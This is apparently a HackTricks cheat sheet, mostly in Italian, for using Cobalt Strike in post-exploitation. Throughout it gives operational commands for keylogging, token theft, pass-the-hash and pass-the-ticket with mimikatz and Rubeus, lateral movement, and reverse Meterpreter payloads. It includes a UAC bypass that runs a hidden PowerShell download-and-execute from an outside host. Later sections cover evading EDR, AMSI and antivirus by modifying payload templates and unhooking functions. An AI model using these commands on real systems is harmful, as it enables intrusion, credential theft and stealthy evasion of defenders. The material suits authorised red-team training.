# Cobalt Strike

{{#include /banners/hacktricks-training.md}}

### Listeners

### C2 Listeners

`Cobalt Strike -> Listeners -> Add/Edit` quindi puoi selezionare dove ascoltare, quale tipo di beacon utilizzare (http, dns, smb...) e altro.

### Peer2Peer Listeners

I beacon di questi listener non devono comunicare direttamente con il C2, possono comunicare tramite altri beacon.

`Cobalt Strike -> Listeners -> Add/Edit` quindi devi selezionare i beacon TCP o SMB

* Il **beacon TCP imposterà un listener nella porta selezionata**. Per connettersi a un beacon TCP usa il comando `connect <ip> <port>` da un altro beacon
* Il **beacon smb ascolterà in un pipename con il nome selezionato**. Per connettersi a un beacon SMB devi usare il comando `link [target] [pipe]`.

### Generate & Host payloads

#### Generate payloads in files

`Attacks -> Packages ->`

* **`HTMLApplication`** per file HTA
* **`MS Office Macro`** per un documento office con una macro
* **`Windows Executable`** per un .exe, .dll o servizio .exe
* **`Windows Executable (S)`** per un **stageless** .exe, .dll o servizio .exe (meglio stageless che staged, meno IoCs)

#### Generate & Host payloads

`Attacks -> Web Drive-by -> Scripted Web Delivery (S)` Questo genererà uno script/eseguibile per scaricare il beacon da cobalt strike in formati come: bitsadmin, exe, powershell e python

#### Host Payloads

Se hai già il file che vuoi ospitare in un server web, vai su `Attacks -> Web Drive-by -> Host File` e seleziona il file da ospitare e la configurazione del server web.

### Beacon Options

<pre class="language-bash"><code class="lang-bash"># Esegui un binario .NET locale
execute-assembly </path/to/executable.exe>
# Nota che per caricare assembly più grandi di 1MB, la proprietà 'tasks_max_size' del profilo malleable deve essere modificata.

# Screenshots
printscreen    # Scatta un singolo screenshot tramite il metodo PrintScr
screenshot     # Scatta un singolo screenshot
screenwatch    # Scatta screenshot periodici del desktop
## Vai su View -> Screenshots per vederli

# keylogger
keylogger [pid] [x86|x64]
## View > Keystrokes per vedere i tasti premuti

# portscan
portscan [pid] [arch] [targets] [ports] [arp|icmp|none] [max connections] # Inietta l'azione di portscan all'interno di un altro processo
portscan [targets] [ports] [arp|icmp|none] [max connections]

# Powershell
## Importa il modulo Powershell
powershell-import C:\path\to\PowerView.ps1
powershell-import /root/Tools/PowerSploit/Privesc/PowerUp.ps1
powershell <scrivi qui il comando powershell> # Questo utilizza la versione di powershell più alta supportata (non oppsec)
powerpick <cmdlet> <args> # Questo crea un processo sacrificabile specificato da spawnto, e inietta UnmanagedPowerShell in esso per una migliore opsec (non logging)
powerpick Invoke-PrivescAudit | fl
psinject <pid> <arch> <commandlet> <arguments> # Questo inietta UnmanagedPowerShell nel processo specificato per eseguire il cmdlet PowerShell.


# User impersonation
## Generazione di token con credenziali
make_token [DOMAIN\user] [password] #Crea un token per impersonare un utente nella rete
ls \\computer_name\c$ # Prova a usare il token generato per accedere a C$ in un computer
rev2self # Smetti di usare il token generato con make_token
## L'uso di make_token genera l'evento 4624: Un account è stato effettuato l'accesso con successo. Questo evento è molto comune in un dominio Windows, ma può essere ristretto filtrando sul Tipo di Accesso. Come accennato sopra, utilizza LOGON32_LOGON_NEW_CREDENTIALS che è di tipo 9.

# UAC Bypass
elevate svc-exe <listener>
elevate uac-token-duplication <listener>
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"

## Ruba token da pid
## Come make_token ma ruba il token da un processo
steal_token [pid] # Inoltre, questo è utile per azioni di rete, non azioni locali
## Dalla documentazione API sappiamo che questo tipo di accesso "consente al chiamante di clonare il proprio token attuale". Questo è il motivo per cui l'output del Beacon dice Impersonated <current_username> - sta impersonando il nostro token clonato.
ls \\computer_name\c$ # Prova a usare il token generato per accedere a C$ in un computer
rev2self # Smetti di usare il token da steal_token

## Avvia processo con nuove credenziali
spawnas [domain\username] [password] [listener] #Fallo da una directory con accesso in lettura come: cd C:\
## Come make_token, questo genererà l'evento Windows 4624: Un account è stato effettuato l'accesso con successo ma con un tipo di accesso di 2 (LOGON32_LOGON_INTERACTIVE). Dettaglierà l'utente chiamante (TargetUserName) e l'utente impersonato (TargetOutboundUserName).

## Inietta nel processo
inject [pid] [x64|x86] [listener]
## Da un punto di vista OpSec: Non eseguire iniezioni cross-platform a meno che non sia davvero necessario (es. x86 -> x64 o x64 -> x86).

## Pass the hash
## Questo processo di modifica richiede la patching della memoria LSASS che è un'azione ad alto rischio, richiede privilegi di amministratore locale e non è molto praticabile se il Protected Process Light (PPL) è abilitato.
pth [pid] [arch] [DOMAIN\user] [NTLM hash]
pth [DOMAIN\user] [NTLM hash]

## Pass the hash tramite mimikatz
mimikatz sekurlsa::pth /user:<username> /domain:<DOMAIN> /ntlm:<NTLM HASH> /run:"powershell -w hidden"
## Senza /run, mimikatz genera un cmd.exe, se stai eseguendo come utente con Desktop, vedrà la shell (se stai eseguendo come SYSTEM sei a posto)
steal_token <pid> #Ruba token dal processo creato da mimikatz

## Pass the ticket
## Richiedi un ticket
execute-assembly /root/Tools/SharpCollection/Seatbelt.exe -group=system
execute-assembly C:\path\Rubeus.exe asktgt /user:<username> /domain:<domain> /aes256:<aes_keys> /nowrap /opsec
## Crea una nuova sessione di accesso da utilizzare con il nuovo ticket (per non sovrascrivere quello compromesso)
make_token <domain>\<username> DummyPass
## Scrivi il ticket nella macchina dell'attaccante da una sessione poweshell & caricalo
[System.IO.File]::WriteAllBytes("C:\Users\Administrator\Desktop\jkingTGT.kirbi", [System.Convert]::FromBase64String("[...ticket...]"))
kerberos_ticket_use C:\Users\Administrator\Desktop\jkingTGT.kirbi

## Pass the ticket da SYSTEM
## Genera un nuovo processo con il ticket
execute-assembly C:\path\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:<AES KEY> /nowrap /opsec /createnetonly:C:\Windows\System32\cmd.exe
## Ruba il token da quel processo
steal_token <pid>

## Estrai ticket + Pass the ticket
### Elenca i ticket
execute-assembly C:\path\Rubeus.exe triage
### Dump ticket interessante per luid
execute-assembly C:\path\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
### Crea una nuova sessione di accesso, annota luid e processid
execute-assembly C:\path\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
### Inserisci il ticket nella sessione di accesso generata
execute-assembly C:\path\Rubeus.exe ptt /luid:0x92a8c /ticket:[...base64-ticket...]
### Infine, ruba il token da quel nuovo processo
steal_token <pid>

# Lateral Movement
## Se un token è stato creato verrà utilizzato
jump [method] [target] [listener]
## Metodi:
## psexec                    x86   Usa un servizio per eseguire un artefatto Service EXE
## psexec64                  x64   Usa un servizio per eseguire un artefatto Service EXE
## psexec_psh                x86   Usa un servizio per eseguire un one-liner PowerShell
## winrm                     x86   Esegui uno script PowerShell tramite WinRM
## winrm64                   x64   Esegui uno script PowerShell tramite WinRM
## wmi_msbuild               x64   movimento laterale wmi con attività inline c# msbuild (oppsec)


remote-exec [method] [target] [command] # remote-exec non restituisce output
## Metodi:
## psexec                          Esecuzione remota tramite Service Control Manager
## winrm                           Esecuzione remota tramite WinRM (PowerShell)
## wmi                             Esecuzione remota tramite WMI

## Per eseguire un beacon con wmi (non è nel comando jump) basta caricare il beacon ed eseguirlo
beacon> upload C:\Payloads\beacon-smb.exe
beacon> remote-exec wmi srv-1 C:\Windows\beacon-smb.exe


# Pass session to Metasploit - Through listener
## Sul host metaploit
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_http
msf6 exploit(multi/handler) > set LHOST eth0
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > exploit -j

## Su cobalt: Listeners > Aggiungi e imposta il Payload su Foreign HTTP. Imposta l'Host su 10.10.5.120, la Porta su 8080 e fai clic su Salva.
beacon> spawn metasploit
## Puoi solo generare sessioni Meterpreter x86 con il listener estero.

# Pass session to Metasploit - Through shellcode injection
## Sul host metasploit
msfvenom -p windows/x64/meterpreter_reverse_http LHOST=<IP> LPORT=<PORT> -f raw -o /tmp/msf.bin
## Esegui msfvenom e prepara il listener multi/handler

## Copia il file bin sul host cobalt strike
ps
shinject <pid> x64 C:\Payloads\msf.bin #Inietta shellcode metasploit in un processo x64

# Pass metasploit session to cobalt strike
## Genera shellcode Beacon stageless, vai su Attacks > Packages > Windows Executable (S), seleziona il listener desiderato, seleziona Raw come tipo di output e seleziona Usa payload x64.
## Usa post/windows/manage/shellcode_inject in metasploit per iniettare il shellcode generato di cobalt strike


# Pivoting
## Apri un proxy socks nel teamserver
beacon> socks 1080

# SSH connection
beacon> ssh 10.10.17.12:22 username password</code></pre>

## Opsec

### Execute-Assembly

Il **`execute-assembly`** utilizza un **processo sacrificabile** usando l'iniezione di processo remoto per eseguire il programma indicato. Questo è molto rumoroso poiché per iniettare all'interno di un processo vengono utilizzate alcune API Win che ogni EDR sta controllando. Tuttavia, ci sono alcuni strumenti personalizzati che possono essere utilizzati per caricare qualcosa nello stesso processo:

- [https://github.com/anthemtotheego/InlineExecute-Assembly](https://github.com/anthemtotheego/InlineExecute-Assembly)
- [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)
- In Cobalt Strike puoi anche usare BOF (Beacon Object Files): [https://github.com/CCob/BOF.NET](https://github.com/CCob/BOF.NET)
- [https://github.com/kyleavery/inject-assembly](https://github.com/kyleavery/inject-assembly)

Lo script aggressore `https://github.com/outflanknl/HelpColor` creerà il comando `helpx` in Cobalt Strike che metterà colori nei comandi indicando se sono BOFs (verde), se sono Frok&Run (giallo) e simili, o se sono ProcessExecution, iniezione o simili (rosso). Questo aiuta a sapere quali comandi sono più furtivi.

### Act as the user

Puoi controllare eventi come `Seatbelt.exe LogonEvents ExplicitLogonEvents PoweredOnEvents`:

- Security EID 4624 - Controlla tutti i logon interattivi per conoscere le abituali ore di lavoro.
- System EID 12,13 - Controlla la frequenza di spegnimento/accensione/sospensione.
- Security EID 4624/4625 - Controlla i tentativi NTLM validi/invalidi in entrata.
- Security EID 4648 - Questo evento viene creato quando vengono utilizzate credenziali in chiaro per effettuare l'accesso. Se un processo lo ha generato, il binario potrebbe avere le credenziali in chiaro in un file di configurazione o all'interno del codice.

Quando usi `jump` da cobalt strike, è meglio usare il metodo `wmi_msbuild` per far sembrare il nuovo processo più legittimo.

### Use computer accounts

È comune che i difensori controllino comportamenti strani generati dagli utenti ed **escludano gli account di servizio e gli account computer come `*$` dal loro monitoraggio**. Puoi utilizzare questi account per eseguire movimenti laterali o escalation dei privilegi.

### Use stageless payloads

I payload stageless sono meno rumorosi rispetto a quelli staged perché non hanno bisogno di scaricare una seconda fase dal server C2. Questo significa che non generano traffico di rete dopo la connessione iniziale, rendendoli meno probabili da rilevare da difese basate sulla rete.

### Tokens & Token Store

Fai attenzione quando rubi o generi token perché potrebbe essere possibile per un EDR enumerare tutti i token di tutti i thread e trovare un **token appartenente a un utente diverso** o persino a SYSTEM nel processo.

Questo consente di memorizzare i token **per beacon** in modo che non sia necessario rubare lo stesso token ripetutamente. Questo è utile per il movimento laterale o quando hai bisogno di utilizzare un token rubato più volte:

- token-store steal <pid>
- token-store steal-and-use <pid>
- token-store show
- token-store use <id>
- token-store remove <id>
- token-store remove-all

Quando ci si muove lateralmente, di solito è meglio **rubare un token piuttosto che generarne uno nuovo** o eseguire un attacco pass the hash.

### Guardrails

Cobalt Strike ha una funzione chiamata **Guardrails** che aiuta a prevenire l'uso di determinati comandi o azioni che potrebbero essere rilevati dai difensori. I guardrails possono essere configurati per bloccare comandi specifici, come `make_token`, `jump`, `remote-exec`, e altri comunemente usati per il movimento laterale o l'escalation dei privilegi.

Inoltre, il repo [https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks](https://github.com/Arvanaghi/CheckPlease/wiki/System-Related-Checks) contiene anche alcuni controlli e idee che potresti considerare prima di eseguire un payload.

### Tickets encryption

In un AD fai attenzione alla crittografia dei ticket. Per impostazione predefinita, alcuni strumenti utilizzeranno la crittografia RC4 per i ticket Kerberos, che è meno sicura rispetto alla crittografia AES e per impostazione predefinita gli ambienti aggiornati utilizzeranno AES. Questo può essere rilevato dai difensori che monitorano algoritmi di crittografia deboli.

### Avoid Defaults

Quando usi Cobalt Strike per impostazione predefinita i pipe SMB avranno il nome `msagent_####` e `"status_####`. Cambia quei nomi. È possibile controllare i nomi dei pipe esistenti da Cobalt Strike con il comando: `ls \\.\pipe\`

Inoltre, con le sessioni SSH viene creato un pipe chiamato `\\.\pipe\postex_ssh_####`. Cambialo con `set ssh_pipename "<new_name>";`.

Anche nell'attacco di post exploitation i pipe `\\.\pipe\postex_####` possono essere modificati con `set pipename "<new_name>"`.

Nei profili di Cobalt Strike puoi anche modificare cose come:

- Evitare di usare `rwx`
- Come funziona il comportamento di iniezione del processo (quali API verranno utilizzate) nel blocco `process-inject {...}`
- Come funziona il "fork and run" nel blocco `post-ex {…}`
- Il tempo di attesa
- La dimensione massima dei binari da caricare in memoria
- L'impronta di memoria e il contenuto DLL con il blocco `stage {...}`
- Il traffico di rete

### Bypass memory scanning

Alcuni EDR scansionano la memoria per alcune firme di malware conosciute. Cobalt Strike consente di modificare la funzione `sleep_mask` come un BOF che sarà in grado di crittografare in memoria il backdoor.

### Noisy proc injections

Quando si inietta codice in un processo, questo è solitamente molto rumoroso, questo perché **nessun processo regolare di solito esegue questa azione e perché i modi per farlo sono molto limitati**. Pertanto, potrebbe essere rilevato da sistemi di rilevamento basati sul comportamento. Inoltre, potrebbe anche essere rilevato da EDR che scansionano la rete per **thread contenenti codice che non è su disco** (anche se processi come i browser che utilizzano JIT hanno questo comunemente). Esempio: [https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2](https://gist.github.com/jaredcatkinson/23905d34537ce4b5b1818c3e6405c1d2)

### Spawnas | PID and PPID relationships

Quando si genera un nuovo processo è importante **mantenere una regolare relazione genitore-figlio** tra i processi per evitare il rilevamento. Se svchost.exec sta eseguendo iexplorer.exe sembrerà sospetto, poiché svchost.exe non è un genitore di iexplorer.exe in un normale ambiente Windows.

Quando un nuovo beacon viene generato in Cobalt Strike, per impostazione predefinita viene creato un processo utilizzando **`rundll32.exe`** per eseguire il nuovo listener. Questo non è molto furtivo e può essere facilmente rilevato dagli EDR. Inoltre, `rundll32.exe` viene eseguito senza argomenti, rendendolo ancora più sospetto.

Con il seguente comando Cobalt Strike, puoi specificare un processo diverso per generare il nuovo beacon, rendendolo meno rilevabile:
```bash
spawnto x86 svchost.exe
```
Puoi anche modificare questa impostazione **`spawnto_x86` e `spawnto_x64`** in un profilo.

### Proxying attackers traffic

A volte gli attaccanti avranno bisogno di eseguire strumenti localmente, anche su macchine Linux, e far sì che il traffico delle vittime raggiunga lo strumento (ad es. NTLM relay).

Inoltre, a volte per eseguire un attacco pass-the-hash o pass-the-ticket è più furtivo per l'attaccante **aggiungere questo hash o ticket nel proprio processo LSASS** localmente e poi pivotare da esso invece di modificare un processo LSASS di una macchina vittima.

Tuttavia, devi essere **attento al traffico generato**, poiché potresti inviare traffico non comune (kerberos?) dal tuo processo di backdoor. Per questo potresti pivotare a un processo del browser (anche se potresti essere scoperto mentre ti inietti in un processo, quindi pensa a un modo furtivo per farlo).
```bash

### Avoiding AVs

#### AV/AMSI/ETW Bypass

Check the page:

{{#ref}}
av-bypass.md
{{#endref}}


#### Artifact Kit

Usually in `/opt/cobaltstrike/artifact-kit` you can find the code and pre-compiled templates (in `/src-common`) of the payloads that cobalt strike is going to use to generate the binary beacons.

Using [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) with the generated backdoor (or just with the compiled template) you can find what is making defender trigger. It's usually a string. Therefore you can just modify the code that is generating the backdoor so that string doesn't appear in the final binary.

After modifying the code just run `./build.sh` from the same directory and copy the `dist-pipe/` folder into the Windows client in `C:\Tools\cobaltstrike\ArtifactKit`.

```
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```

Don't forget to load the aggressive script `dist-pipe\artifact.cna` to indicate Cobalt Strike to use the resources from disk that we want and not the ones loaded.

#### Resource Kit

The ResourceKit folder contains the templates for Cobalt Strike's script-based payloads including PowerShell, VBA and HTA.

Using [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck) with the templates you can find what is defender (AMSI in this case) not liking and modify it:

```
.\ThreatCheck.exe -e AMSI -f .\cobaltstrike\ResourceKit\template.x64.ps1
```

Modifying the detected lines one can generate a template that won't be caught.

Don't forget to load the aggressive script `ResourceKit\resources.cna` to indicate Cobalt Strike to luse the resources from disk that we want and not the ones loaded.

#### Function hooks | Syscall

Function hooking is a very common method of ERDs to detect malicious activity. Cobalt Strike allows you to bypass these hooks by using **syscalls** instead of the standard Windows API calls using the **`None`** config, or use the `Nt*` version of a function with the **`Direct`** setting, or just jumping over the `Nt*` function with the **`Indirect`** option in the malleable profile. Depending on the system, an optino might be more stealth then the other.

This can be set in the profile or suing the command **`syscall-method`**

However, this could also be noisy.

Some option granted by Cobalt Strike to bypass function hooks is to remove those hooks with: [**unhook-bof**](https://github.com/Cobalt-Strike/unhook-bof).

You could also check with functions are hooked with [**https://github.com/Mr-Un1k0d3r/EDRs**](https://github.com/Mr-Un1k0d3r/EDRs) or [**https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector**](https://github.com/matterpreter/OffensiveCSharp/tree/master/HookDetector)




```bash
cd C:\Tools\neo4j\bin  
neo4j.bat console  
http://localhost:7474/ --> Cambiare password  
execute-assembly C:\Tools\SharpHound3\SharpHound3\bin\Debug\SharpHound.exe -c All -d DOMAIN.LOCAL  

# Cambiare powershell  
C:\Tools\cobaltstrike\ResourceKit  
template.x64.ps1  
# Cambiare $var_code -> $polop  
# $x --> $ar  
cobalt strike --> script manager --> Load --> Cargar C:\Tools\cobaltstrike\ResourceKit\resources.cna  

#artifact kit  
cd  C:\Tools\cobaltstrike\ArtifactKit  
pscp -r root@kali:/opt/cobaltstrike/artifact-kit/dist-pipe .
```


{{#include /banners/hacktricks-training.md}}
